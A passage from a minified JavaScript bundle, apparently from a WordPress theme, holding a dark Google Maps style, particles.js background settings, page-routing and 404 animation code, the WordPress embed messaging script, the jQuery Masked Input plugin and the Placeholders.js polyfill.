                        stylers: [{
                            color: "#000000"
                        },
                        {
                            lightness: 18
                        }]
                    },
                    {
                        featureType: "road.local",
                        elementType: "geometry",
                        stylers: [{
                            color: "#000000"
                        },
                        {
                            lightness: 16
                        }]
                    },
                    {
                        featureType: "transit",
                        elementType: "geometry",
                        stylers: [{
                            color: "#000000"
                        },
                        {
                            lightness: 19
                        }]
                    },
                    {
                        featureType: "water",
                        elementType: "geometry",
                        stylers: [{
                            color: "#000000"
                        },
                        {
                            lightness: 17
                        }]
                    }]
                } (),
                particlesJS("dust-particles", {
                    particles: {
                        number: {
                            value: 20,
                            density: {
                                enable: !1,
                                value_area: 800
                            }
                        },
                        color: {
                            value: "#36edff"
                        },
                        shape: {
                            type: "circle",
                            stroke: {
                                width: 0,
                                color: "#000000"
                            },
                            polygon: {
                                nb_sides: 5
                            },
                            image: {
                                src: "img/github.svg",
                                width: 100,
                                height: 100
                            }
                        },
                        opacity: {
                            value: 1,
                            random: !0,
                            anim: {
                                enable: !1,
                                speed: 1,
                                opacity_min: .1,
                                sync: !1
                            }
                        },
                        size: {
                            value: 10,
                            random: !0,
                            anim: {
                                enable: !1,
                                speed: 40,
                                size_min: .1,
                                sync: !1
                            }
                        },
                        line_linked: {
                            enable: !1,
                            distance: 150,
                            color: "#ffffff",
                            opacity: .4,
                            width: 1
                        },
                        move: {
                            enable: !0,
                            speed: 2,
                            direction: "none",
                            random: !1,
                            straight: !1,
                            out_mode: "out",
                            bounce: !1,
                            attract: {
                                enable: !1,
                                rotateX: 600,
                                rotateY: 1200
                            }
                        }
                    },
                    interactivity: {
                        detect_on: "canvas",
                        events: {
                            onhover: {
                                enable: !1,
                                mode: "repulse"
                            },
                            onclick: {
                                enable: !1,
                                mode: "push"
                            },
                            resize: !0
                        },
                        modes: {
                            grab: {
                                distance: 400,
                                line_linked: {
                                    opacity: 1
                                }
                            },
                            bubble: {
                                distance: 400,
                                size: 40,
                                duration: 2,
                                opacity: 8,
                                speed: 3
                            },
                            repulse: {
                                distance: 200,
                                duration: .4
                            },
                            push: {
                                particles_nb: 4
                            },
                            remove: {
                                particles_nb: 2
                            }
                        }
                    },
                    retina_detect: !0
                })
            },
            finalize: function() {}
        },
        error404: {
            init: function() {
                t(window).load(function() {
                    t("#error .cnt h1").addClass("on"),
                    t("#error .cnt p").addClass("on"),
                    setTimeout(function() {
                        t(".form-btn").addClass("on"),
                        t(".sticky-nav").addClass("on"),
                        t("#error .link").addClass("on")
                    },
                    1300)
                }),
                particlesJS("dust-particles", {
                    particles: {
                        number: {
                            value: 20,
                            density: {
                                enable: !1,
                                value_area: 800
                            }
                        },
                        color: {
                            value: "#36edff"
                        },
                        shape: {
                            type: "circle",
                            stroke: {
                                width: 0,
                                color: "#000000"
                            },
                            polygon: {
                                nb_sides: 5
                            },
                            image: {
                                src: "img/github.svg",
                                width: 100,
                                height: 100
                            }
                        },
                        opacity: {
                            value: 1,
                            random: !0,
                            anim: {
                                enable: !1,
                                speed: 1,
                                opacity_min: .1,
                                sync: !1
                            }
                        },
                        size: {
                            value: 10,
                            random: !0,
                            anim: {
                                enable: !1,
                                speed: 40,
                                size_min: .1,
                                sync: !1
                            }
                        },
                        line_linked: {
                            enable: !1,
                            distance: 150,
                            color: "#ffffff",
                            opacity: .4,
                            width: 1
                        },
                        move: {
                            enable: !0,
                            speed: 2,
                            direction: "none",
                            random: !1,
                            straight: !1,
                            out_mode: "out",
                            bounce: !1,
                            attract: {
                                enable: !1,
                                rotateX: 600,
                                rotateY: 1200
                            }
                        }
                    },
                    interactivity: {
                        detect_on: "canvas",
                        events: {
                            onhover: {
                                enable: !1,
                                mode: "repulse"
                            },
                            onclick: {
                                enable: !1,
                                mode: "push"
                            },
                            resize: !0
                        },
                        modes: {
                            grab: {
                                distance: 400,
                                line_linked: {
                                    opacity: 1
                                }
                            },
                            bubble: {
                                distance: 400,
                                size: 40,
                                duration: 2,
                                opacity: 8,
                                speed: 3
                            },
                            repulse: {
                                distance: 200,
                                duration: .4
                            },
                            push: {
                                particles_nb: 4
                            },
                            remove: {
                                particles_nb: 2
                            }
                        }
                    },
                    retina_detect: !0
                })
            }
        }
    },
    r = {
        fire: function(t, e, i) {
            var r, s = n;
            e = void 0 === e ? "init": e,
            r = "" !== t,
            r = r && s[t],
            (r = r && "function" == typeof s[t][e]) && s[t][e](i)
        },
        loadEvents: function() {
            r.fire("common"),
            t.each(document.body.className.replace(/-/g, "_").split(/\s+/),
            function(t, e) {
                r.fire(e),
                r.fire(e, "finalize")
            }),
            r.fire("common", "finalize")
        }
    };
    t(document).ready(r.loadEvents)
} (window.jQuery, window.Clique);; !
function(a, b) {
    "use strict";
    function c() {
        if (!e) {
            e = !0;
            var a, c, d, f, g = -1 !== navigator.appVersion.indexOf("MSIE 10"),
            h = !!navigator.userAgent.match(/Trident.*rv:11\./),
            i = b.querySelectorAll("iframe.wp-embedded-content");
            for (c = 0; c < i.length; c++) {
                if (d = i[c], !d.getAttribute("data-secret")) f = Math.random().toString(36).substr(2, 10),
                d.src += "#?secret=" + f,
                d.setAttribute("data-secret", f);
                if (g || h) a = d.cloneNode(!0),
                a.removeAttribute("security"),
                d.parentNode.replaceChild(a, d)
            }
        }
    }
    var d = !1,
    e = !1;
    if (b.querySelector) if (a.addEventListener) d = !0;
    if (a.wp = a.wp || {},
    !a.wp.receiveEmbedMessage) if (a.wp.receiveEmbedMessage = function(c) {
        var d = c.data;
        if (d.secret || d.message || d.value) if (!/[^a-zA-Z0-9]/.test(d.secret)) {
            var e, f, g, h, i, j = b.querySelectorAll('iframe[data-secret="' + d.secret + '"]'),
            k = b.querySelectorAll('blockquote[data-secret="' + d.secret + '"]');
            for (e = 0; e < k.length; e++) k[e].style.display = "none";
            for (e = 0; e < j.length; e++) if (f = j[e], c.source === f.contentWindow) {
                if (f.removeAttribute("style"), "height" === d.message) {
                    if (g = parseInt(d.value, 10), g > 1e3) g = 1e3;
                    else if (~~g < 200) g = 200;
                    f.height = g
                }
                if ("link" === d.message) if (h = b.createElement("a"), i = b.createElement("a"), h.href = f.getAttribute("src"), i.href = d.value, i.host === h.host) if (b.activeElement === f) a.top.location.href = d.value
            } else;
        }
    },
    d) a.addEventListener("message", a.wp.receiveEmbedMessage, !1),
    b.addEventListener("DOMContentLoaded", c, !1),
    a.addEventListener("load", c, !1)
} (window, document);; !
function(e) {
    "function" == typeof define && define.amd ? define(["jquery"], e) : e("object" == typeof exports ? require("jquery") : jQuery)
} (function(e) {
    var t, n = navigator.userAgent,
    a = /iphone/i.test(n),
    i = /chrome/i.test(n),
    r = /android/i.test(n);
    e.mask = {
        definitions: {
            9 : "[0-9]",
            a: "[A-Za-z]",
            "*": "[A-Za-z0-9]"
        },
        autoclear: !0,
        dataName: "rawMaskFn",
        placeholder: "_"
    },
    e.fn.extend({
        caret: function(e, t) {
            var n;
            if (0 !== this.length && !this.is(":hidden")) return "number" == typeof e ? (t = "number" == typeof t ? t: e, this.each(function() {
                this.setSelectionRange ? this.setSelectionRange(e, t) : this.createTextRange && (n = this.createTextRange(), n.collapse(!0), n.moveEnd("character", t), n.moveStart("character", e), n.select())
            })) : (this[0].setSelectionRange ? (e = this[0].selectionStart, t = this[0].selectionEnd) : document.selection && document.selection.createRange && (n = document.selection.createRange(), e = 0 - n.duplicate().moveStart("character", -1e5), t = e + n.text.length), {
                begin: e,
                end: t
            })
        },
        unmask: function() {
            return this.trigger("unmask")
        },
        mask: function(n, o) {
            var c, l, u, f, s, h, g, m;
            if (!n && this.length > 0) {
                c = e(this[0]);
                var d = c.data(e.mask.dataName);
                return d ? d() : void 0
            }
            return o = e.extend({
                autoclear: e.mask.autoclear,
                placeholder: e.mask.placeholder,
                completed: null
            },
            o),
            l = e.mask.definitions,
            u = [],
            f = g = n.length,
            s = null,
            e.each(n.split(""),
            function(e, t) {
                "?" == t ? (g--, f = e) : l[t] ? (u.push(new RegExp(l[t])), null === s && (s = u.length - 1), f > e && (h = u.length - 1)) : u.push(null)
            }),
            this.trigger("unmask").each(function() {
                function c() {
                    if (o.completed) {
                        for (var e = s; h >= e; e++) if (u[e] && C[e] === d(e)) return;
                        o.completed.call(w)
                    }
                }
                function d(e) {
                    return o.placeholder.charAt(e < o.placeholder.length ? e: 0)
                }
                function p(e) {
                    for (; ++e < g && !u[e];);
                    return e
                }
                function v(e) {
                    for (; --e >= 0 && !u[e];);
                    return e
                }
                function b(e, t) {
                    var n, a;
                    if (! (0 > e)) {
                        for (n = e, a = p(t); g > n; n++) if (u[n]) {
                            if (! (g > a && u[n].test(C[a]))) break;
                            C[n] = C[a],
                            C[a] = d(a),
                            a = p(a)
                        }
                        A(),
                        w.caret(Math.max(s, e))
                    }
                }
                function k(e) {
                    var t, n, a, i;
                    for (t = e, n = d(e); g > t; t++) if (u[t]) {
                        if (a = p(t), i = C[t], C[t] = n, !(g > a && u[a].test(i))) break;
                        n = i
                    }
                }
                function y() {
                    var e = w.val(),
                    t = w.caret();
                    if (m && m.length && m.length > e.length) {
                        for (T(!0); t.begin > 0 && !u[t.begin - 1];) t.begin--;
                        if (0 === t.begin) for (; t.begin < s && !u[t.begin];) t.begin++;
                        w.caret(t.begin, t.begin)
                    } else {
                        for (T(!0); t.begin < g && !u[t.begin];) t.begin++;
                        w.caret(t.begin, t.begin)
                    }
                    c()
                }
                function x() {
                    T(),
                    w.val() != E && w.change()
                }
                function j(e) {
                    if (!w.prop("readonly")) {
                        var t, n, i, r = e.which || e.keyCode;
                        m = w.val(),
                        8 === r || 46 === r || a && 127 === r ? (t = w.caret(), n = t.begin, i = t.end, i - n === 0 && (n = 46 !== r ? v(n) : i = p(n - 1), i = 46 === r ? p(i) : i), S(n, i), b(n, i - 1), e.preventDefault()) : 13 === r ? x.call(this, e) : 27 === r && (w.val(E), w.caret(0, T()), e.preventDefault())
                    }
                }
                function R(t) {
                    if (!w.prop("readonly")) {
                        var n, a, i, o = t.which || t.keyCode,
                        l = w.caret();
                        if (! (t.ctrlKey || t.altKey || t.metaKey || 32 > o) && o && 13 !== o) {
                            if (l.end - l.begin !== 0 && (S(l.begin, l.end), b(l.begin, l.end - 1)), n = p(l.begin - 1), g > n && (a = String.fromCharCode(o), u[n].test(a))) {
                                if (k(n), C[n] = a, A(), i = p(n), r) {
                                    var f = function() {
                                        e.proxy(e.fn.caret, w, i)()
                                    };
                                    setTimeout(f, 0)
                                } else w.caret(i);
                                l.begin <= h && c()
                            }
                            t.preventDefault()
                        }
                    }
                }
                function S(e, t) {
                    var n;
                    for (n = e; t > n && g > n; n++) u[n] && (C[n] = d(n))
                }
                function A() {
                    w.val(C.join(""))
                }
                function T(e) {
                    var t, n, a, i = w.val(),
                    r = -1;
                    for (t = 0, a = 0; g > t; t++) if (u[t]) {
                        for (C[t] = d(t); a++<i.length;) if (n = i.charAt(a - 1), u[t].test(n)) {
                            C[t] = n,
                            r = t;
                            break
                        }
                        if (a > i.length) {
                            S(t + 1, g);
                            break
                        }
                    } else C[t] === i.charAt(a) && a++,
                    f > t && (r = t);
                    return e ? A() : f > r + 1 ? o.autoclear || C.join("") === D ? (w.val() && w.val(""), S(0, g)) : A() : (A(), w.val(w.val().substring(0, r + 1))),
                    f ? t: s
                }
                var w = e(this),
                C = e.map(n.split(""),
                function(e, t) {
                    return "?" != e ? l[e] ? d(t) : e: void 0
                }),
                D = C.join(""),
                E = w.val();
                w.data(e.mask.dataName,
                function() {
                    return e.map(C,
                    function(e, t) {
                        return u[t] && e != d(t) ? e: null
                    }).join("")
                }),
                w.one("unmask",
                function() {
                    w.off(".mask").removeData(e.mask.dataName)
                }).on("focus.mask",
                function() {
                    if (!w.prop("readonly")) {
                        clearTimeout(t);
                        var e;
                        E = w.val(),
                        e = T(),
                        t = setTimeout(function() {
                            w.get(0) === document.activeElement && (A(), e == n.replace("?", "").length ? w.caret(0, e) : w.caret(e))
                        },
                        10)
                    }
                }).on("blur.mask", x).on("keydown.mask", j).on("keypress.mask", R).on("input.mask paste.mask",
                function() {
                    w.prop("readonly") || setTimeout(function() {
                        var e = T(!0);
                        w.caret(e),
                        c()
                    },
                    0)
                }),
                i && r && w.off("input.mask").on("input.mask", y),
                T()
            })
        }
    })
});; (function(t) {
    "use strict";
    function e(t, e, r) {
        return t.addEventListener ? t.addEventListener(e, r, !1) : t.attachEvent ? t.attachEvent("on" + e, r) : void 0
    }
    function r(t, e) {
        var r, n;
        for (r = 0, n = t.length; n > r; r++) if (t[r] === e) return ! 0;
        return ! 1
    }
    function n(t, e) {
        var r;
        t.createTextRange ? (r = t.createTextRange(), r.move("character", e), r.select()) : t.selectionStart && (t.focus(), t.setSelectionRange(e, e))
    }
    function a(t, e) {
        try {
            return t.type = e,
            !0
        } catch(r) {
            return ! 1
        }
    }
    t.Placeholders = {
        Utils: {
            addEventListener: e,
            inArray: r,
            moveCaret: n,
            changeType: a
        }
    }
})(this),
function(t) {
    "use strict";
    function e() {}
    function r() {
        try {
            return document.activeElement
        } catch(t) {}
    }
    function n(t, e) {
        var r, n, a = !!e && t.value !== e,
        u = t.value === t.getAttribute(V);
        return (a || u) && "true" === t.getAttribute(P) ? (t.removeAttribute(P), t.value = t.value.replace(t.getAttribute(V), ""), t.className = t.className.replace(R, ""), n = t.getAttribute(z), parseInt(n, 10) >= 0 && (t.setAttribute("maxLength", n), t.removeAttribute(z)), r = t.getAttribute(D), r && (t.type = r), !0) : !1
    }
    function a(t) {
        var e, r, n = t.getAttribute(V);
        return "" === t.value && n ? (t.setAttribute(P, "true"), t.value = n, t.className += " " + I, r = t.getAttribute(z), r || (t.setAttribute(z, t.maxLength), t.removeAttribute("maxLength")), e = t.getAttribute(D), e ? t.type = "text": "password" === t.type && K.changeType(t, "text") && t.setAttribute(D, "password"), !0) : !1
    }
    function u(t, e) {
        var r, n, a, u, i, l, o;
        if (t && t.getAttribute(V)) e(t);
        else for (a = t ? t.getElementsByTagName("input") : f, u = t ? t.getElementsByTagName("textarea") : h, r = a ? a.length: 0, n = u ? u.length: 0, o = 0, l = r + n; l > o; o++) i = r > o ? a[o] : u[o - r],
        e(i)
    }
    function i(t) {
        u(t, n)
    }
    function l(t) {
        u(t, a)
    }
    function o(t) {
        return function() {
            b && t.value === t.getAttribute(V) && "true" === t.getAttribute(P) ? K.moveCaret(t, 0) : n(t)
        }
    }
    function c(t) {
        return function() {
            a(t)
        }
    }
    function s(t) {
        return function(e) {
            return A = t.value,
            "true" === t.getAttribute(P) && A === t.getAttribute(V) && K.inArray(C, e.keyCode) ? (e.preventDefault && e.preventDefault(), !1) : void 0
        }
    }
    function d(t) {
        return function() {
            n(t, A),
            "" === t.value && (t.blur(), K.moveCaret(t, 0))
        }
    }
    function v(t) {
        return function() {
            t === r() && t.value === t.getAttribute(V) && "true" === t.getAttribute(P) && K.moveCaret(t, 0)
        }
    }
    function g(t) {
        return function() {
            i(t)
        }
    }
    function p(t) {
        t.form && (T = t.form, "string" == typeof T && (T = document.getElementById(T)), T.getAttribute(U) || (K.addEventListener(T, "submit", g(T)), T.setAttribute(U, "true"))),
        K.addEventListener(t, "focus", o(t)),
        K.addEventListener(t, "blur", c(t)),
        b && (K.addEventListener(t, "keydown", s(t)), K.addEventListener(t, "keyup", d(t)), K.addEventListener(t, "click", v(t))),
        t.setAttribute(j, "true"),
        t.setAttribute(V, x),
        (b || t !== r()) && a(t)
    }
    var f, h, b, m, A, y, E, x, L, T, S, N, w, B = ["text", "search", "url", "tel", "email", "password", "number", "textarea"],
    C = [27, 33, 34, 35, 36, 37, 38, 39, 40, 8, 46],
    k = "#ccc",
    I = "placeholdersjs",
    R = RegExp("(?:^|\\s)" + I + "(?!\\S)"),
    V = "data-placeholder-value",
    P = "data-placeholder-active",
    D = "data-placeholder-type",
    U = "data-placeholder-submit",
    j = "data-placeholder-bound",
    q = "data-placeholder-focus",
    Q = "data-placeholder-live",
    z = "data-placeholder-maxlength",
    F = document.createElement("input"),
    G = document.getElementsByTagName("head")[0],
    H = document.documentElement,
    J = t.Placeholders,
    K = J.Utils;
    if (J.nativeSupport = void 0 !== F.placeholder, !J.nativeSupport) {
        for (f = document.getElementsByTagName("input"), h = document.getElementsByTagName("textarea"), b = "false" === H.getAttribute(q), m = "false" !== H.getAttribute(Q), y = document.createElement("style"), y.type = "text/css", E = document.createTextNode("." + I + " { color:" + k + "; }"), y.styleSheet ? y.styleSheet.cssText = E.nodeValue: y.appendChild(E), G.insertBefore(y, G.firstChild), w = 0, N = f.length + h.length; N > w; w++) S = f.length > w ? f[w] : h[w - f.length],
        x = S.attributes.placeholder,
        x && (x = x.nodeValue, x && K.inArray(B, S.type) && p(S));
        L = setInterval(function() {
            for (w = 0, N = f.length + h.length; N > w; w++) S = f.length > w ? f[w] : h[w - f.length],
            x = S.attributes.placeholder,
            x ? (x = x.nodeValue, x && K.inArray(B, S.type) && (S.getAttribute(j) || p(S), (x !== S.getAttribute(V) || "password" === S.type && !S.getAttribute(D)) && ("password" === S.type && !S.getAttribute(D) && K.changeType(S, "text") && S.setAttribute(D, "password"), S.value === S.getAttribute(V) && (S.value = x), S.setAttribute(V, x)))) : S.getAttribute(P) && (n(S), S.removeAttribute(V));
            m || clearInterval(L)
        },
        100)
    }
    K.addEventListener(t, "beforeunload",
    function() {
        J.disable()
    }),
    J.disable = J.nativeSupport ? e: i,
    J.enable = J.nativeSupport ? e: l
} (this),
function(t) {
    "use strict";
    var e = t.fn.val,
    r = t.fn.prop;
    Placeholders.nativeSupport || (t.fn.val = function(t) {
        var r = e.apply(this, arguments),
        n = this.eq(0).data("placeholder-value");
        return void 0 === t && this.eq(0).data("placeholder-active") && r === n ? "": r
    },
    t.fn.prop = function(t, e) {
        return void 0 === e && this.eq(0).data("placeholder-active") && "value" === t ? "": r.apply(this, arguments)
    })
} (jQuery);